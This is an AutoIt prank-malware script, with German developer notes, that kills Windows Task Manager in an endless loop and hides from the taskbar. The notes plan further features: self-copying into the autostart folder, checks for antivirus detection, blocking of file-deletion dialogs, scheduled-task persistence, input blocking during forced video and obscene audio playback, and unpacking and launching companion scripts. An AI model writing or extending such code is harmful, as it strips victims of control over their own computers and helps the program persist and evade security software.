#comments-start
THE TASKMNGR CLOSER
#comments-end

#include <MsgBoxConstants.au3>
#include <StringConstants.au3>
;#NoTrayIcon
Break(0);



#comments-start
======= FUNCTIONS======
#comments-end

Func _exitCode()
   Run(@ScriptDir & "\coc.exe");
EndFunc

Func _blockerTaskMgr()

   while true
	 #cs
	  Opt("WinWaitDelay",1);
	  WinWaitActive("Windows Task-Manager");
	  ControlDisable("Windows Task-Manager", "", "&Prozess beenden");
	  ControlDisable("Windows Task-Manager", "", "SysListView321");
	  ControlDisable("Windows Task-Manager", "", "SysTabControl321");
	  ControlDisable("Windows Task-Manager", "", "SysHeader324");
	  #ce
    If ProcessExists("taskmgr.exe") Then
		 ProcessClose("taskmgr.exe");
	  EndIf
   Wend
EndFunc



#comments-start
======= CODE TO BE EXECUTET AT START OF SCRIPT ======
#comments-end

HotKeySet("{F9}"  , "_exitCode");
_blockerTaskMgr();



#comments-start

*füg einen schutz zum exiten ein (passwort eingeben) ( Break bei richtigem passwort veränderbar)
-> done

probleme: P:)script to deactivate the "Task-Manager" does not continue running while the user hits the HotKeySet
Solution: S:)maybe source this out in an other script ==> done

		 P:)user can be verry smart, using arrow keys and the del key for manually navigating to close the programm
		 S:) close taskmanager over processes ==> done
		 S:) detect key press and do other stuff instead


Solution:

	  BlockInput(1); raus, da dieses script nur den taskmanager eliminieren soll ==> done#

*einen extenen "checker" der bei Systemstart ausgeführt wird, von sich und den daten copien erstellt und immer beim Hochfahren prüft
	  ob die dateien im autostart ordner sind oder nicht
	  ja -> weiter checken
	  nein -> von jetziger direction in autostart ordner die gewünschten dateien kopieren
        -> weiter checken
	  checken: in 1 - 5 minuten intervallen. (unauffällig sein)
*  testen ob beim filecopieren / filemoven antivirus / firewall meckert

* Break(0) um in der leiste unten rechts in der ecke kein laufendes programm zu haben

* schutzmasnahme einbauen: passwort eingeben um alle scripte zu terminieren
	  ProcessClose()-> sehr hilfreich.
	  nur: ein script laufen lassen das im hintergrund einen hotkey abcheckt
			und dann beim drücken einer Tastenkombination / hotkey darauf reagiert, ein passwort fordert und dann alle anderen scripte terminiert wenn das passwort richtig ist.
			-> ansonsten einfach ausschalten, auf neue hotkey eingabe warten.

*schutz gegen löschen einbauen:
	  script ollsich selbst wieder in autostart kopieren
	  blockieren der fenster "Ordner Löschen" , "datei Löschen"
	  bzw. böpckieren der bestätigung (ja button)

* sowas wie schtasks... (das script als task laufen zu lassen -> acc portabilität) sogar beim systemhochfahren ist es möglich das programm laufen zu lassen... interessant...

* schau mal wie man auch .wav datein oder sogar videos abspielen lassen kann (des doch ma ne idee: es kommt zufällig irgendwann ein video aufgeploppt)
	  -> ShellExecute() will open a media (or other type of) file using the default program.
		 If you want to select a different program then it wouild require more code.
		 You don't need to put the script inside any particular folder,
		 but you do have to give the full path of the file you want to open (in this case the path to the media file).

* während video spielt : input verbieten.
		 ShellExecuteWait() statt ShellExecute();
		 After running the requested program the script pauses until the requested program terminates.
		 (sleep solange wie das video dauert. beginne mit zeitzählung von sleep wenn programm gestartet ist und läuft.)

* evtl nur sounds abspielen (oder dazu) like: GaBAN! HAAAX! FUCK HER RIGHT IN THE PUSSY! MLGTröten! SMOKE WEED EVERYDAY!

* automatisch irgendwelche seiten ansteuern und öffnen wie: "www.selbsthilfegruppe.de" (etc)
	  -> eingabe solange blockiert (und immer der taskmanager :D)

** script, das eine .zip oder ähnliches entpackt! (seine brüder entpackt und ausführt)

* unter win 10 testen

#comments-end
